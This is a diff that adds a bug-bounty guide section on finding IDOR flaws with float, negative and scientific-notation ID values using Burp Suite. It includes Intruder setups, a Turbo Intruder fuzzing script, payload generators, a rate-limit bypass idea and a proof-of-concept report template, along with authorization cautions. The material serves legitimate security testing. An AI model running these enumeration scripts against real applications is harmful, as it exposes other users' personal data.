@@ -17192,3 +17192,659 @@ docker run -d -p 80:80 vulnerables/web-dvwa
 6. **Document every step** for reproducible findings
 
 Remember: HPP-based IDOR can be subtle. Always verify findings manually and document the exact behavior for your report!
+
+# 🔍 **Bug #31: Float Values IDOR - Complete Burp Suite Methodology**
+
+## **📌 Bug Description**
+**IDOR via Float Value Manipulation** - Testing if the application accepts float/decimal values as object references and whether these are improperly validated or truncated, leading to unauthorized access.
+
+---
+
+## **⚙️ Initial Setup in Burp Suite**
+
+### **1. Burp Configuration**
+```yaml
+Proxy Settings:
+  - Intercept: ON
+  - Response Interception: OFF initially
+  
+Scope Configuration:
+  - Add target domain to scope
+  - Enable "Use advanced scope control"
+  - Include: *.target.com
+  
+Session Handling:
+  - Enable Cookie Jar
+  - Add macro for authentication if needed
+```
+
+### **2. Target Identification**
+```bash
+# Look for endpoints with patterns:
+/api/user/{id}
+/download?file_id=100
+/profile?id=100
+/view?document=200
+/order?ref=300
+
+# Common parameter names:
+id, user_id, uid, pid, doc_id, file_id, order_id, ref_id
+account_number, invoice_no, ticket_id, message_id
+```
+
+---
+
+## **🔎 Phase 1: Reconnaissance**
+
+### **Step 1.1: Map Parameters**
+```http
+# Use Burp Spider/Discovery
+1. Right-click on target → Spider → Scope
+2. Engagement Tools → Discover Content
+3. Target → Site Map → Filter by parameter
+```
+
+### **Step 1.2: Parameter Analysis**
+```bash
+# Using Burp Intruder for parameter discovery
+Attack Type: Sniper
+Payload: Parameter wordlist (common parameters)
+
+# Monitor for:
+- Response length changes
+- Status code differences
+- Error messages
+```
+
+### **Step 1.3: Identify Authentication Context**
+```http
+# Capture a request with valid ID
+GET /api/user/100 HTTP/1.1
+Host: target.com
+Cookie: session=valid_session
+Authorization: Bearer token_here
+
+# Note: Keep this authenticated session throughout testing
+```
+
+---
+
+## **🧪 Phase 2: Basic Float Testing**
+
+### **Step 2.1: Direct Float Substitution**
+```http
+# Original Integer Request
+GET /api/user/100 HTTP/1.1
+
+# Test Case 1: Simple Float
+GET /api/user/100.1 HTTP/1.1
+
+# Test Case 2: Float with .0
+GET /api/user/100.0 HTTP/1.1
+
+# Test Case 3: Negative Float
+GET /api/user/-100.5 HTTP/1.1
+
+# Test Case 4: Large Float
+GET /api/user/999999999.999 HTTP/1.1
+```
+
+### **Step 2.2: Burp Intruder Setup for Float Testing**
+```yaml
+Target: /api/user/§100§
+
+Payload Processing:
+  1. Add: 0.1, 0.5, 0.9 suffix
+  2. Add: .0, .00, .000 prefix
+  3. Add: negative variations
+  4. Add: scientific notation
+
+Attack Types:
+  - Sniper: Single float variations
+  - Battering ram: Same float in multiple positions
+  - Pitchfork: Different floats for different params
+```
+
+### **Step 2.3: Response Analysis**
+```python
+# Use Burp Extender or manual analysis
+Response Analysis Checklist:
+□ Status Code Changes (200 vs 403 vs 404)
+□ Response Length Variations
+□ Error Messages
+□ Data Leakage
+□ Timing Differences
+□ Cache Headers
+□ Content-Type Changes
+```
+
+---
+
+## **🎯 Phase 3: Advanced Float Manipulations**
+
+### **Step 3.1: Float Boundary Testing**
+```http
+# Minimum float values
+GET /api/user/0.0000000001 HTTP/1.1
+GET /api/user/1e-10 HTTP/1.1
+
+# Maximum float values
+GET /api/user/9999999999.9999999999 HTTP/1.1
+GET /api/user/1e10 HTTP/1.1
+
+# Edge cases
+GET /api/user/0.9999999999 HTTP/1.1
+GET /api/user/100.9999999999 HTTP/1.1
+GET /api/user/100.0000000001 HTTP/1.1
+```
+
+### **Step 3.2: Float Truncation Testing**
+```http
+# Test if application truncates floats to integers
+Original: 100 → Access to user 100
+Float: 100.9 → Should be user 100 if truncated
+Float: 99.1 → Should be user 99 if truncated
+
+# Methodology:
+1. Find two sequential users (99 and 100)
+2. Test with 99.1, 99.9, 100.1, 100.9
+3. Analyze which user data is returned
+```
+
+### **Step 3.3: Float Injection Points**
+```http
+# URL Path
+GET /api/orders/100.5/items HTTP/1.1
+
+# Query Parameters
+GET /api/data?user_id=100.5&doc=200.7 HTTP/1.1
+
+# POST Body (JSON)
+POST /api/update HTTP/1.1
+Content-Type: application/json
+{"user_id": 100.5, "action": "view"}
+
+# POST Body (Form)
+POST /api/view HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+user_id=100.5&doc_id=200.7
+
+# Headers
+GET /api/resource HTTP/1.1
+X-User-ID: 100.5
+X-Resource-ID: 200.7
+
+# Cookies
+Cookie: user=100.5; session=abc123
+```
+
+---
+
+## **📊 Phase 4: Systematic Testing with Burp Suite**
+
+### **Step 4.1: Burp Intruder - Comprehensive Float Attack**
+
+```yaml
+Attack Configuration:
+  
+  Target: /api/user/§100§
+  
+  Payload Sets:
+  Set 1: Base numbers
+    - Current user ID: 100
+    - Previous user ID: 99
+    - Next user ID: 101
+    - Admin ID: 1 (if known)
+    - Random valid ID: 500
+    
+  Set 2: Float suffixes
+    - .0, .00, .000
+    - .1, .2, .3 ... .9
+    - .01, .02, ... .99
+    - .001, .002, ... .999
+    - .5, .50, .500
+    - .05, .005, .0005
+    
+  Set 3: Float prefixes
+    - 0.1, 0.01, 0.001
+    - -0.1, -0.01, -0.001
+    - +0.1, +0.01
+    
+  Set 4: Scientific notation
+    - 1e0, 1e1, 1e-1
+    - 100e0, 100e-1
+    - 1.5e2 (150), 1.5e-2 (0.015)
+```
+
+### **Step 4.2: Burp Intruder - Cluster Bomb Attack**
+```yaml
+Attack Type: Cluster Bomb
+Positions: /api/user/§100§/document/§200§
+
+Payload Set 1: User IDs (float variations)
+  - 100, 100.1, 100.5, 100.9
+  - 99, 99.1, 99.5, 99.9
+  - 101, 101.1, 101.5, 101.9
+
+Payload Set 2: Document IDs (float variations)
+  - 200, 200.1, 200.5, 200.9
+  - 199, 199.1, 199.5, 199.9
+  - 201, 201.1, 201.5, 201.9
+
+Grep - Extract:
+  - Response status
+  - Content-Length
+  - Specific data patterns
+  - Error messages
+```
+
+### **Step 4.3: Burp Sequencer for Token Analysis**
+```yaml
+If IDs are generated but sometimes appear as floats:
+
+1. Send request to Sequencer
+2. Configure token location
+3. Run live capture (at least 100 tokens)
+4. Analyze:
+   - Character-level analysis
+   - Bit-level analysis
+   - FIPS 140-2 tests
+   - Correlation analysis
+```
+
+---
+
+## **🛠️ Phase 5: Burp Extender & Custom Tools**
+
+### **Step 5.1: Useful Burp Extensions**
+```python
+# 1. JSON Beautifier - For JSON response analysis
+# 2. Hackvertor - For encoding/decoding floats
+# 3. Param Miner - Discover hidden parameters
+# 4. Autorize - Authorization testing
+# 5. AuthMatrix - Matrix-based testing
+# 6. Turbo Intruder - High-speed attacks
+# 7. Flow - Visual request analysis
+```
+
+### **Step 5.2: Turbo Intruder Script for Float Fuzzing**
+```python
+# Turbo Intruder Python Script
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=100,
+                           pipeline=False
+                           )
+    
+    # Generate float payloads
+    base_ids = [100, 99, 101, 1, 500]
+    fractions = ['.0', '.1', '.2', '.3', '.4', '.5', '.6', '.7', '.8', '.9',
+                 '.01', '.05', '.09', '.001', '.005', '.009']
+    
+    for base in base_ids:
+        for fraction in fractions:
+            payload = str(base) + fraction
+            engine.queue(target.req, payload)
+            
+    # Scientific notation
+    sci_notations = ['1e0', '1e1', '1e-1', '1.5e2', '1.5e-2']
+    for sci in sci_notations:
+        engine.queue(target.req, sci)
+
+def handleResponse(req, interesting):
+    if '200 OK' in req.response:
+        table.add(req)
+```
+
+### **Step 5.3: Custom Intruder Payloads**
+```python
+# Generate complex float payloads
+import itertools
+
+base = [100, 99, 101]
+fractions = ['.{}'.format(str(x).zfill(i)) 
+             for i in range(1,5) 
+             for x in range(10**i)]
+
+negatives = ['-{}'.format(x) for x in base]
+scientific = ['{}e{}'.format(b, e) 
+              for b in [1, 1.5, 9.9] 
+              for e in [-5, -2, -1, 0, 1, 2, 5]]
+
+all_payloads = base + fractions + negatives + scientific
+```
+
+---
+
+## **📈 Phase 6: Response Analysis Techniques**
+
+### **Step 6.1: Automated Response Comparison**
+```http
+# Use Burp Comparer
+1. Select two responses (integer vs float)
+2. Send to Comparer
+3. Analyze:
+   - Word comparison
+   - Byte comparison
+   - Visual diff
+```
+
+### **Step 6.2: Response Pattern Analysis**
+```python
+# Response analysis checklist
+Analysis Points:
+1. HTTP Status Code
+   - 200: Potential success
+   - 403: Blocked (good security)
+   - 404: Not found (may indicate invalid ID)
+   - 500: Server error (potential vulnerability)
+   - 302: Redirect (check redirect location)
+
+2. Content-Length
+   - Same as integer request → Same data
+   - Different length → Different data/error
+   - Zero length → Possible block
+
+3. Response Time
+   - Measure using Burp Logger
+   - Look for timing differences
+   - Use Logger++ for analysis
+
+4. Headers Analysis
+   - Cache-Control headers
+   - Content-Disposition (file downloads)
+   - Location headers (redirects)
+   - Set-Cookie (session changes)
+
+5. Body Content
+   - Data exposure patterns
+   - Error messages
+   - Stack traces
+   - Debug information
+```
+
+### **Step 6.3: Burp Logger++ Configuration**
+```yaml
+Logger++ Filters:
+  - Filter by MIME type: JSON, XML, HTML
+  - Filter by status: 200, 403, 500
+  - Regex filter: (user|profile|account|admin)
+  - Time filter: > 1000ms (slow responses)
+  - Size filter: different from baseline
+```
+
+---
+
+## **🔄 Phase 7: Exploitation Scenarios**
+
+### **Step 7.1: Data Enumeration via Floats**
+```http
+# If float truncation occurs (e.g., 100.9 → 100)
+# You can potentially enumerate valid IDs by analyzing responses
+
+Attack Pattern:
+1. Send requests: 1.1, 1.2, 1.3 ... 1000.9
+2. Group responses by data returned
+3. Map which floats map to which integers
+4. If multiple floats return same data, truncation confirmed
+```
+
+### **Step 7.2: Bypassing Rate Limits**
+```http
+# Float variations might bypass rate limiting
+# Rate limit based on integer ID but you use float
+
+Normal: /api/user/100 (blocked after 10 requests)
+Bypass: /api/user/100.1, /api/user/100.2, etc.
+```
+
+### **Step 7.3: IDOR Chaining with Floats**
+```http
+# Step 1: Access another user's profile
+GET /api/user/101.5 HTTP/1.1
+
+# Step 2: Extract their document IDs from response
+Response contains: {"documents": [200, 201, 202]}
+
+# Step 3: Access those documents with float manipulation
+GET /api/document/200.7 HTTP/1.1
+```
+
+---
+
+## **📋 Phase 8: Validation & Reporting**
+
+### **Step 8.1: Manual Validation Checklist**
+```markdown
+□ Confirm float parameter is accepted
+□ Verify which user's data is returned
+□ Check if other users' data is accessible
+□ Test with different user accounts
+□ Validate with multiple float values
+□ Check for data leakage in responses
+□ Test with authenticated and unauthenticated sessions
+□ Verify if float truncation occurs
+□ Test across different endpoints
+□ Check if float IDOR works for other operations (POST, PUT, DELETE)
+```
+
+### **Step 8.2: Proof of Concept Template**
+```http
+# Original Request (Legitimate)
+GET /api/user/100 HTTP/1.1
+Host: target.com
+Cookie: session=attacker_session
+
+Response: {"id":100, "name":"Attacker", "email":"attacker@test.com"}
+
+# POC Request (Float IDOR)
+GET /api/user/101.5 HTTP/1.1
+Host: target.com
+Cookie: session=attacker_session
+
+Response: {"id":101, "name":"Victim", "email":"victim@test.com"}
+
+# Impact: Unauthorized access to Victim's profile data
+# Float value 101.5 was truncated to 101, bypassing authorization
+```
+
+### **Step 8.3: Report Template**
+```markdown
+# Vulnerability: IDOR via Float Parameter Manipulation
+
+## Severity: High
+
+## Endpoint: /api/user/{id}
+
+## Description:
+The application accepts float values as user IDs and improperly truncates them to integers without proper authorization checks. This allows an authenticated user to access other users' profiles by manipulating the ID parameter with float values.
+
+## Steps to Reproduce:
+1. Login as attacker (User ID: 100)
+2. Capture request to /api/user/100
+3. Modify ID to 101.5 (victim's ID with float)
+4. Observe victim's data in response
+
+## Impact:
+- Unauthorized access to other users' personal information
+- Potential data breach of PII
+- Account enumeration possible
+
+## Remediation:
+- Implement proper access controls server-side
+- Validate parameter types strictly (reject non-integers)
+- Use indirect reference maps (UUIDs)
+- Add rate limiting on ID enumeration
+
+## CVSS Score: 7.5 (High)
+Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
+```
+
+---
+
+## **🛡️ Phase 9: Automation Scripts**
+
+### **Step 9.1: Python Automation with Burp API**
+```python
+# Using Burp Extender API
+from burp import IBurpExtender, IHttpListener
+import re
+
+class BurpExtender(IBurpExtender, IHttpListener):
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("Float IDOR Detector")
+        callbacks.registerHttpListener(self)
+        print("Float IDOR Detector loaded")
+        
+    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
+        if not messageIsRequest:
+            # Analyze responses
+            response = messageInfo.getResponse()
+            if response:
+                analyzed = self._helpers.analyzeResponse(response)
+                # Check for float parameters in request
+                request = messageInfo.getRequest()
+                analyzedRequest = self._helpers.analyzeRequest(request)
+                params = analyzedRequest.getParameters()
+                
+                for param in params:
+                    if self.is_float(param.getValue()):
+                        print(f"Float parameter found: {param.getName()}={param.getValue()}")
+                        
+    def is_float(self, value):
+        try:
+            float(value)
+            return '.' in value or 'e' in value.lower()
+        except:
+            return False
+```
+
+### **Step 9.2: Burp Intruder Payload Generator**
+```python
+# Custom Intruder Payload Generator
+from burp import IIntruderPayloadGeneratorFactory, IIntruderPayloadGenerator
+import math
+
+class FloatPayloadGenerator(IIntruderPayloadGenerator):
+    def __init__(self):
+        self._base_ids = [100, 99, 101, 1]
+        self._fractions = [0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9]
+        self._current_index = 0
+        self._payloads = self.generate_payloads()
+        
+    def generate_payloads(self):
+        payloads = []
+        for base in self._base_ids:
+            for frac in self._fractions:
+                # Regular floats
+                payloads.append(str(base + frac))
+                # Negative floats
+                payloads.append(str(-(base + frac)))
+                # Scientific notation
+                payloads.append(f"{base}e-1")
+                payloads.append(f"{base}e-2")
+        return payloads
+        
+    def hasMorePayloads(self):
+        return self._current_index < len(self._payloads)
+        
+    def getNextPayload(self, baseValue):
+        payload = self._payloads[self._current_index]
+        self._current_index += 1
+        return payload.encode()
+```
+
+---
+
+## **📊 Phase 10: Advanced Testing Matrix**
+
+### **Comprehensive Test Matrix**
+```yaml
+Test Cases Matrix:
+
+| Category | Test Type | Payload | Expected | Actual |
+|----------|-----------|---------|----------|--------|
+| Basic | Simple Float | 100.5 | 403/200 | |
+| Basic | Zero Float | 0.5 | 403 | |
+| Boundary | Min Float | 0.0000001 | 403 | |
+| Boundary | Max Float | 9999999.9999 | 403 | |
+| Truncation | Slightly Higher | 100.1 | 403 | |
+| Truncation | Slightly Lower | 99.9 | 403 | |
+| Negative | Negative Float | -100.5 | 403/500 | |
+| Scientific | Small | 1e-5 | 403 | |
+| Scientific | Large | 1e10 | 403/500 | |
+| Encoding | URL Encoded | 100%2E5 | 403 | |
+| Encoding | Double Encoded | 100%252E5 | 403 | |
+| Unicode | Unicode | 100\u002E5 | 403 | |
+| Chaining | Multi-param | 100.5&doc=200.7 | Varies | |
+| Method | POST | {"id":100.5} | 403 | |
+| Header | X-User-ID | 100.5 | 403 | |
+| Cookie | Cookie value | 100.5 | 403 | |
+```
+
+---
+
+## **⚠️ Important Considerations**
+
+### **Legal & Ethical**
+- ✅ Obtain written authorization
+- ✅ Stay within scope
+- ✅ Don't access/steal actual data
+- ✅ Report responsibly
+- ✅ Stop if you find PII
+
+### **Technical Precautions**
+- ⚠️ Use test accounts only
+- ⚠️ Monitor rate limiting
+- ⚠️ Don't DoS the application
+- ⚠️ Log all your tests
+- ⚠️ Have rollback plan
+
+### **When to Stop Testing**
+- 🛑 Found sensitive PII
+- 🛑 Application crashes
+- 🛑 Rate limiting triggers
+- 🛑 Account lockout occurs
+- 🛑 Legal team contact needed
+
+---
+
+## **📚 Additional Resources**
+
+### **Burp Suite Training**
+- PortSwigger: IDOR labs with floats
+- Burp Suite Academy: Advanced intruder attacks
+- YouTube: Float manipulation techniques
+
+### **Practice Labs**
+- DVWA: IDOR module
+- WebGoat: A5 Broken Access Control
+- PentesterLab: IDOR exercises
+- HackTheBox: Machines with IDOR
+
+### **Tools & Extensions**
+- Turbo Intruder
+- JSON/XML Beautifier
+- Hackvertor
+- Autorize
+- AuthMatrix
+- Flow
+- Logger++
+
+---
+
+## **🎯 Success Criteria**
+
+You've successfully found Bug #31 if:
+- ✅ Application accepts float values
+- ✅ Float values are processed/truncated
+- ✅ Different users' data is accessible
+- ✅ Authorization is bypassed
+- ✅ You can reproduce consistently
+- ✅ Impact is clearly demonstrated
+
+---
+
